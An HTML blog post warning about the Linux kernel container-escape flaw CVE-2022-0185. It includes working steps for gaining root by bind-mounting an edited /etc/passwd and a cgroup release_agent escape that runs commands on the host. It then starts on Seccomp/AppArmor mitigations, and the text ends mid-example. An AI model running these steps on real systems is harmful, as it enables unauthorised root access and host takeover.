<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>High Risk! Kubernetes New Container Escape Vulnerability Warning! - SoByte</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6356451834813761" crossorigin="anonymous"></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-E8GRRGBTEZ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-E8GRRGBTEZ');
</script>


<meta name="author" content="" /><meta name="description" content="On January 18, 2022, Linux maintainers and vendors discovered a heap buffer overflow vulnerability in the legacy_parse_param function of the Linux kernel (5.1-rc1&#43;) file system context function with the vulnerability ID number CVE-2022-0185, which is a high-risk vulnerability with a severity rating of is 7.8 . The vulnerability allows for out-of-bounds writes in kernel memory. Using this vulnerability, an unprivileged attacker could bypass the restrictions of any Linux namespace and" /><meta name="keywords" content="k8s, Container Escape, Vulnerability" />






<meta name="generator" content="Hugo 0.92.2 with theme even" />


<link rel="canonical" href="https://www.sobyte.net/post/2022-03/k8s-container-escape-vulnerability/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="High Risk! Kubernetes New Container Escape Vulnerability Warning!" />
<meta property="og:description" content="On January 18, 2022, Linux maintainers and vendors discovered a heap buffer overflow vulnerability in the legacy_parse_param function of the Linux kernel (5.1-rc1&#43;) file system context function with the vulnerability ID number CVE-2022-0185, which is a high-risk vulnerability with a severity rating of is 7.8 . The vulnerability allows for out-of-bounds writes in kernel memory. Using this vulnerability, an unprivileged attacker could bypass the restrictions of any Linux namespace and" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.sobyte.net/post/2022-03/k8s-container-escape-vulnerability/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-03-04T09:37:19+08:00" />
<meta property="article:modified_time" content="2022-03-04T09:37:19+08:00" />

<meta itemprop="name" content="High Risk! Kubernetes New Container Escape Vulnerability Warning!">
<meta itemprop="description" content="On January 18, 2022, Linux maintainers and vendors discovered a heap buffer overflow vulnerability in the legacy_parse_param function of the Linux kernel (5.1-rc1&#43;) file system context function with the vulnerability ID number CVE-2022-0185, which is a high-risk vulnerability with a severity rating of is 7.8 . The vulnerability allows for out-of-bounds writes in kernel memory. Using this vulnerability, an unprivileged attacker could bypass the restrictions of any Linux namespace and"><meta itemprop="datePublished" content="2022-03-04T09:37:19+08:00" />
<meta itemprop="dateModified" content="2022-03-04T09:37:19+08:00" />
<meta itemprop="wordCount" content="2189">
<meta itemprop="keywords" content="k8s," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="High Risk! Kubernetes New Container Escape Vulnerability Warning!"/>
<meta name="twitter:description" content="On January 18, 2022, Linux maintainers and vendors discovered a heap buffer overflow vulnerability in the legacy_parse_param function of the Linux kernel (5.1-rc1&#43;) file system context function with the vulnerability ID number CVE-2022-0185, which is a high-risk vulnerability with a severity rating of is 7.8 . The vulnerability allows for out-of-bounds writes in kernel memory. Using this vulnerability, an unprivileged attacker could bypass the restrictions of any Linux namespace and"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">SoByte</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a><a href="/ukraine/">
        <li class="mobile-menu-item">UKRAINE</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">SoByte</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/ukraine/">UKRAINE</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">High Risk! Kubernetes New Container Escape Vulnerability Warning!</h1>

      <div class="post-meta">
        <span class="post-time"> 2022-03-04 09:37:19 </span>
        <div class="post-category">
            <a href="/categories/tutorials/"> tutorials </a>
            </div>
          <span class="more-meta"> 2189 words </span>
          <span class="more-meta"> 5 mins read </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#vulnerability-details">Vulnerability details</a></li>
        <li><a href="#poc">PoC</a>
          <ul>
            <li><a href="#normal-user-elevated-to-root-user">Normal user elevated to root user</a></li>
            <li><a href="#view-all-processes-on-the-host-in-a-container">View all processes on the host in a container</a></li>
          </ul>
        </li>
        <li><a href="#solutions">Solutions</a>
          <ul>
            <li><a href="#container-level">Container level</a></li>
            <li><a href="#host-level">Host level</a></li>
          </ul>
        </li>
        <li><a href="#lastly">Lastly</a></li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <p>On January 18, 2022, Linux maintainers and vendors discovered a heap buffer <a href="https://en.wikipedia.org/wiki/Heap_overflow">overflow</a> vulnerability in the <strong>legacy_parse_param</strong> function of the Linux kernel (5.1-rc1+) file system context function with the vulnerability ID number <a href="ttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a>, which is a high-risk vulnerability with a severity rating of is <strong>7.8</strong> .</p>
<p>The vulnerability allows for out-of-bounds writes in kernel memory. Using this vulnerability, an unprivileged attacker could bypass the restrictions of any Linux namespace and elevate its privileges to root. for example, if an attacker infiltrates your container, it could escape from the container and elevate privileges.</p>
<p>This vulnerability was introduced in March 2019 in the Linux kernel <strong>5.1-rc1</strong> version. A patch was released on January 18 to fix this issue, and all Linux users are advised to download and install the latest version of the kernel.</p>
<h2 id="vulnerability-details">Vulnerability details</h2>
<p>The vulnerability is caused by an integer underflow condition found in the legacy_parse_param function of the file system context function (fs/fs_context.c). The <strong>file system context</strong> function creates superblocks for mounting and remounting file systems, which record a file system&rsquo;s characteristics, such as block and file size, and any storage blocks.</p>
<p>By sending more than 4095 bytes of input to the legacy_parse_param function, it is possible to bypass the input length detection and cause an out-of-bounds write, triggering the vulnerability. An attacker could use this vulnerability to write malicious code to other parts of memory, causing a system crash, or could execute arbitrary code to elevate privileges.</p>
<p>The input data for the <strong>legacy_parse_param</strong> function is added via the <a href="http://kernsec.org/pipermail/linux-security-module-archive/2019-February/011442.html">fsconfig</a> system call to configure the file system creation context (e.g., an ext4 file system superblock).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// 使用 fsconfig 系统调用添加由 val 指向的以空字符（NULL）结尾的字符串
</span><span class="c1"></span><span class="n">fsconfig</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FSCONFIG_SET_STRING</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>To use the fsconfig system call, a non-privileged user must have at least <strong><a href="https://lwn.net/Articles/486306/">CAP_SYS_ADMIN</a></strong> privileges in their current namespace. This means that if the user has access to another namespace with these privileges, it is sufficient to exploit this vulnerability.</p>
<p>If the <strong>CAP_SYS_ADMIN</strong> privilege is not available to a non-privileged user, an attacker could obtain it via the <strong>unshare(CLONE_NEWNS|CLONE_NEWUSER)</strong> system call. The Unshare system call allows a user to create or clone a namespace or user, thus having the necessary privileges to perform further attacks. This technique is important for the Kubernetes and container worlds that use Linux namespaces to isolate Pods, and an attacker can fully exploit this in a container escape attack, where <strong>once successful, the attacker can gain full control over the host OS and all containers running on the system</strong> to further attack other machines on the internal network segment, <strong>even even deploy malicious containers in a Kubernetes cluster</strong>.</p>
<p>The research team that discovered the vulnerability posted code and a proof of concept to exploit it on <a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185">GitHub</a> on January 25.</p>
<h2 id="poc">PoC</h2>
<p>Docker and other container runs use Seccomp profiles by default to prevent processes in the container from using dangerous system calls to protect Linux namespace boundaries.</p>
<blockquote>
<p>Seccomp (full name: secure computing mode) was introduced to the Linux kernel in version 2.6.12 (March 8, 2005) to limit the system calls available to processes to four: read, write, _exit, and sigreturn. initially this mode was a whitelist approach, in which the secure mode In addition to the open file descriptor and the four allowed system calls, the kernel uses SIGKILL or SIGSYS to terminate the process if any other system call is attempted.</p>
</blockquote>
<p>However, Kubernetes does not use any Seccomp or AppArmor/SELinux profiles by default to restrict system calls to Pods, which makes it dangerous for processes in Pods to freely access dangerous system calls and wait for the opportunity to gain the necessary privileges (such as CAP_SYS_ADMIN) for further attacks.</p>
<p>Let&rsquo;s start with a Docker example where the unshare command is not available in a standard Docker environment, and <a href="https://docs.docker.com/engine/security/seccomp/">Docker&rsquo;s Seccomp filter</a>blocks the system calls used by this command.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="err">$</span> <span class="n">docker</span> <span class="n">run</span> <span class="o">--</span><span class="n">rm</span> <span class="o">-</span><span class="n">it</span> <span class="n">alpine</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
<span class="o">/</span> <span class="err">#</span> <span class="n">unshare</span>
<span class="nl">unshare</span><span class="p">:</span> <span class="n">unshare</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">:</span> <span class="n">Operation</span> <span class="n">not</span> <span class="n">permitted</span>
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s look at the Kubernetes Pod.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ kubectl run --rm -it <span class="nb">test</span> --image<span class="o">=</span>ubuntu /bin/bash
If you don<span class="err">&#39;</span>t see a <span class="nb">command</span> prompt, try pressing enter.
root@test:/# lsns <span class="p">|</span> grep user
<span class="m">4026531837</span> user        <span class="m">3</span>   <span class="m">1</span> root /bin/bash
root@test:/#
root@test:/# apt update <span class="o">&amp;&amp;</span> apt install -y libcap2 libcap-ng-utils
root@test:/# ......
root@test:/# pscap -a
ppid  pid   name        <span class="nb">command</span>           capabilities
<span class="m">0</span>     <span class="m">1</span>     root        bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
</code></pre></td></tr></table>
</div>
</div><p>You can see that the root user in the Pod does not have CAP_SYS_ADMIN capability, but we can get CAP_SYS_ADMIN capability by unshare command.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">root@test:/# unshare -Urm
<span class="c1">#</span>
<span class="c1"># pscap -a</span>
ppid  pid   name        <span class="nb">command</span>           capabilities
<span class="m">0</span>     <span class="m">1</span>     root        bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
<span class="m">1</span>     <span class="m">265</span>   root        sh                full
<span class="c1"># lsns | grep user</span>
<span class="m">4026532695</span> user        <span class="m">3</span>   <span class="m">265</span> root -sh
</code></pre></td></tr></table>
</div>
</div><p>So what can you do with CAP_SYS_ADMIN? Here are two examples to show how CAP_SYS_ADMIN can be used to infiltrate a system.</p>
<h3 id="normal-user-elevated-to-root-user">Normal user elevated to root user</h3>
<p>The following procedure can be used to elevate a normal user on the host directly to the root user.</p>
<p>First, give python3 the CAP_SYS_ADMIN capability (note that you cannot manipulate soft links, only original files).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ which python3
/usr/bin/python3

$ ll /usr/bin/python3
lrwxrwxrwx <span class="m">1</span> root root <span class="m">9</span> Mar <span class="m">13</span>  <span class="m">2020</span> /usr/bin/python3 -&gt; python3.8*

$ setcap CAP_SYS_ADMIN+ep /usr/bin/python3.8
$ getcap /usr/bin/python3.8
/usr/bin/python3.8 <span class="o">=</span> cap_sys_admin+ep
</code></pre></td></tr></table>
</div>
</div><p>Create a normal user.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ useradd <span class="nb">test</span> -d /home/test -m
</code></pre></td></tr></table>
</div>
</div><p>Then switch to the normal user and go to the user home directory.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ su <span class="nb">test</span>
$ <span class="nb">cd</span> ~
</code></pre></td></tr></table>
</div>
</div><p>Copy /etc/passwd to the current directory and finish changing the root user&rsquo;s password to &quot; <strong>password</strong>&quot;.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ cp /etc/passwd ./
$ openssl passwd -1 -salt abc password
<span class="nv">$1$abc$BXBqpb9BZcZhXLgbee</span>.0s/

<span class="c1"># 将第一行的 root:x 改为 root:$1$abc$BXBqpb9BZcZhXLgbee.0s/</span>
$ head -2 passwd
root:<span class="nv">$1$abc$BXBqpb9BZcZhXLgbee</span>.0s/:0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
</code></pre></td></tr></table>
</div>
</div><p>Mount the modified passwd file to <strong>/etc/passwd</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="c"># cat mount-passwd.py</span><span class="err">
</span><span class="err"></span><span class="k">from</span><span class="s"> ctypes import *</span><span class="err">
</span><span class="err"></span><span class="nv">libc</span> <span class="o">=</span> CDLL<span class="o">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="o">)</span><span class="err">
</span><span class="err"></span>libc.mount.argtypes <span class="o">=</span> <span class="o">(</span>c_char_p, c_char_p, c_char_p, c_ulong, c_char_p<span class="o">)</span><span class="err">
</span><span class="err"></span><span class="nv">MS_BIND</span> <span class="o">=</span> <span class="m">4096</span><span class="err">
</span><span class="err"></span><span class="nb">source</span> <span class="o">=</span> b<span class="s2">&#34;/home/test/passwd&#34;</span><span class="err">
</span><span class="err"></span><span class="nv">target</span> <span class="o">=</span> b<span class="s2">&#34;/etc/passwd&#34;</span><span class="err">
</span><span class="err"></span><span class="nv">filesystemtype</span> <span class="o">=</span> b<span class="s2">&#34;none&#34;</span><span class="err">
</span><span class="err"></span><span class="nv">options</span> <span class="o">=</span> b<span class="s2">&#34;rw&#34;</span><span class="err">
</span><span class="err"></span><span class="nv">mountflags</span> <span class="o">=</span> MS_BIND<span class="err">
</span><span class="err"></span>libc.mount<span class="o">(</span>source, target, filesystemtype, mountflags, options<span class="o">)</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ python3 mount-passwd.py
</code></pre></td></tr></table>
</div>
</div><p><strong>Finally is the moment to witness the miracle!!!</strong> Switch directly to the root user and enter the password &ldquo;password&rdquo;.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ su root
Password:
root@coredns:/home/test#
</code></pre></td></tr></table>
</div>
</div><p>Amazing, I&rsquo;ve switched to the root user.</p>
<p>Let&rsquo;s see if you really got root privileges.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ find / -name <span class="s2">&#34;*flag*&#34;</span> 2&gt;/dev/null
/sys/kernel/tracing/events/power/pm_qos_update_flags
/sys/kernel/debug/tracing/events/power/pm_qos_update_flags
/sys/kernel/debug/block/vdb/hctx0/flags
/sys/kernel/debug/block/vda/hctx0/flags
/sys/kernel/debug/block/loop7/hctx0/flags
/sys/kernel/debug/block/loop6/hctx0/flags
/sys/kernel/debug/block/loop5/hctx0/flags
/sys/kernel/debug/block/loop4/hctx0/flags
/sys/kernel/debug/block/loop3/hctx0/flags
/sys/kernel/debug/block/loop2/hctx0/flags
/sys/kernel/debug/block/loop1/hctx0/flags
/sys/kernel/debug/block/loop0/hctx0/flags
....

$ cat /sys/kernel/debug/block/vdb/hctx0/flags
<span class="nv">alloc_policy</span><span class="o">=</span>FIFO SHOULD_MERGE
</code></pre></td></tr></table>
</div>
</div><p>Well, it&rsquo;s root, that&rsquo;s right.</p>
<p>Finally, remember to uninstall /etc/passwd.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ umount /etc/passwd
</code></pre></td></tr></table>
</div>
</div><p>So, System Reboot Engineers, see if the normal users you assign to others have CAP_SYS_ADMIN capability!</p>
<h3 id="view-all-processes-on-the-host-in-a-container">View all processes on the host in a container</h3>
<p>Let&rsquo;s look at another container example. The following magic operation allows you to <strong>get all the processes running on the host</strong> in a container.</p>
<p>We don&rsquo;t need to use the <code>--privileged</code> argument to run a privileged container, that would be pointless.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ docker run --rm -it --cap-add<span class="o">=</span>SYS_ADMIN --security-opt <span class="nv">apparmor</span><span class="o">=</span>unconfined ubuntu bash
</code></pre></td></tr></table>
</div>
</div><p>Next, execute the following command in the container. The final effect is to execute the <strong>ps aux</strong> command on the host and save its output to the <strong>/output</strong> file in the container.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="c1"># Mounts the RDMA cgroup controller and create a child cgroup</span>
<span class="c1"># This technique should work with the majority of cgroup controllers</span>
<span class="c1"># If you&#39;re following along and get &#34;mount: /tmp/cgrp: special device cgroup does not exist&#34;</span>
<span class="c1"># It&#39;s because your setup doesn&#39;t have the RDMA cgroup controller, try change rdma to memory to fix it</span>
mkdir /tmp/cgrp <span class="o">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span class="o">&amp;&amp;</span> mkdir /tmp/cgrp/x
<span class="c1"># Finds path of OverlayFS mount for container</span>
<span class="c1"># Unless the configuration explicitly exposes the mount point of the host filesystem</span>
<span class="c1"># see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html</span>
<span class="nv">host_path</span><span class="o">=</span><span class="sb">`</span>sed -n <span class="s1">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span class="sb">`</span>
<span class="c1"># Sets release_agent to /path/payload</span>
<span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$host_path</span><span class="s2">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
<span class="c1"># Creates a payload</span>
<span class="nb">echo</span> <span class="s1">&#39;#!/bin/sh&#39;</span> &gt; /cmd
<span class="nb">echo</span> <span class="s2">&#34;ps aux &gt; </span><span class="nv">$host_path</span><span class="s2">/output&#34;</span> &gt;&gt; /cmd
chmod a+x /cmd
<span class="c1"># Executes the attack by spawning a process that immediately ends inside the &#34;x&#34; child cgroup</span>
<span class="c1"># By creating a /bin/sh process and writing its PID to the cgroup.procs file in &#34;x&#34; child cgroup directory</span>
<span class="c1"># The script on the host will execute after /bin/sh exits</span>
sh -c <span class="s2">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
<span class="c1"># Reads the output</span>
cat /output
</code></pre></td></tr></table>
</div>
</div><p>Eventually you can see all the processes running in the host in the container.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">root@0c84f7587629:/# cat /output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           <span class="m">1</span>  0.0  0.3 <span class="m">172704</span> <span class="m">13148</span> ?        Ss    <span class="m">2021</span> 131:32 /sbin/init nopti
root           <span class="m">2</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        S     <span class="m">2021</span>   0:18 <span class="o">[</span>kthreadd<span class="o">]</span>
root           <span class="m">3</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        I&lt;    <span class="m">2021</span>   0:00 <span class="o">[</span>rcu_gp<span class="o">]</span>
root           <span class="m">4</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        I&lt;    <span class="m">2021</span>   0:00 <span class="o">[</span>rcu_par_gp<span class="o">]</span>
root           <span class="m">6</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        I&lt;    <span class="m">2021</span>   0:00 <span class="o">[</span>kworker/0:0H-kblockd<span class="o">]</span>
root           <span class="m">8</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        I&lt;    <span class="m">2021</span>   0:00 <span class="o">[</span>mm_percpu_wq<span class="o">]</span>
root           <span class="m">9</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        S     <span class="m">2021</span>  18:36 <span class="o">[</span>ksoftirqd/0<span class="o">]</span>
root          <span class="m">10</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        I     <span class="m">2021</span> 262:22 <span class="o">[</span>rcu_sched<span class="o">]</span>
root          <span class="m">11</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        S     <span class="m">2021</span>   3:06 <span class="o">[</span>migration/0<span class="o">]</span>
root          <span class="m">12</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        S     <span class="m">2021</span>   0:00 <span class="o">[</span>idle_inject/0<span class="o">]</span>
root          <span class="m">14</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        S     <span class="m">2021</span>   0:00 <span class="o">[</span>cpuhp/0<span class="o">]</span>
root          <span class="m">15</span>  0.0  0.0      <span class="m">0</span>     <span class="m">0</span> ?        S     <span class="m">2021</span>   0:00 <span class="o">[</span>cpuhp/1<span class="o">]</span>
......
</code></pre></td></tr></table>
</div>
</div><p>I will not explain the specific meaning of these commands, interested parties can study it themselves against the comments.</p>
<p>What is certain is that CAP_SYS_ADMIN capability provides more possibilities for attackers, both in the host and in the container, especially in the container environment, and if we cannot upgrade the kernel due to force majeure factors, we should look for other solutions.</p>
<h2 id="solutions">Solutions</h2>
<h3 id="container-level">Container level</h3>
<p>Since v1.22, Kubernetes has been able to use SecurityContext to add default Seccomp or AppArmor profiles to resource objects to protect Pods, Deployment, Statefulset, Daemonset, and more. While this feature is currently in Alpha, users can add their own Seccomp or AppArmor profile and define it in SecurityContext.</p>
<p>Example.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
